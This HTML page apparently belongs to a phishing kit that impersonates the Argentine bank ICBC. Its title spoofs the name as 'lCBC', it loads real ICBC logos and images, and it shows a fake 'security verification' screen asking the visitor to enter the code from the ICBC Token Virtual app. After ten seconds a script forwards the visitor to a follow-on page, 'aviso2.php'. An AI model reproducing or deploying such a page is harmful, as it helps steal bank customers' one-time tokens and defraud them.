<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="/accstatic/favicon.ico" type="image/x-icon">
  <title>lCBC</title>
  <style>
    body {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #fcfcfc; /* Puedes cambiar el color de fondo según tu preferencia */
    }

    .loader-container {
      text-align: center;

    }

    .loader {
      display: inline-block;
      padding: 20px;
      background-color: #ffffff00; /* Puedes cambiar el color del fondo del loader según tu preferencia */
      border-radius: 12px;
      box-shadow: 0 0 4px rgba(0, 0, 0, 0);
    }

    .logo {
      font-size: 24px;
      font-weight: bold;
      margin-bottom: 10px;

      /* Estilo para el logo (puedes personalizar esto) */
    }

    .loading-text p {
      margin: 8px 0;
      display: inline-block;
    }

    .dots-container {
      display: inline-block;
    }

    .dot {
      width: 2px;
      height: 2px;
      background-color: #333;
      border-radius: 20%;
      margin: 0 1px;
      animation: blink 1s infinite;
      display: inline-block;
    }

    @keyframes blink {
      0%, 100% {
        opacity: 0;
      }
      50% {
        opacity: 1;
      }
    }
  </style>
</head>
<body>
  <div class="loader-container">
    <div class="loader">
      <img src="/htdc/1.webp" width="250" alt="">
      <br>
      <img src="https://www.sueldos.icbc.com.ar/assets/images/loader.gif?v=210102342s232" width="80" alt="">

      <br>
      <br>
      <div class="loading-text">
        <p style="font-weight: 600; font-weight: 500; font-weight: 600;">Verificacion de Seguridad</p>
        <br>
        <p style="font-weight: 600; font-weight: 500; font-weight: 600;" >Ingresá el código generado en tu aplicación ICBC Token Virtual<span class="dots-container">
          <span class="dot"></span>
          <span class="dot"></span>
          <span class="dot"></span>
        </span></p>
        <br>
        <br>
      </div>
    </div>
  </div>
  <br>
  <img src="https://www.icbc.com.ar/personas/productos-servicios/inversiones/alpha-fondos/!ut/p/z0/fY6xDoIwEIZfBQbH5rAYkJFFiYmLxgS6mNJWPSU9oJXo21uMs9t993-5-0FADcLKCa_SI1nZBW5Edi74MquqFd9vN6c0KQ_HjOf5mvMihx2I_0K4gPdhECUIRdabl4caVavYlyxqYsYtkt6MLnycp5H0U3ly0TtyZpxQIYU12ikoodVsy66_SXYhq8kxbdgvjFUat6mF_iGaD9FjW3g!/ICBC/images/digital_assistant/chat-icon.png" width="120" alt="Descripción de la imagen" style="position: fixed; bottom: 0; right: 0;">
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      setTimeout(function() {
        window.location.href = 'aviso2.php';
      }, 10000);
    });
  </script>
</body>
</html>

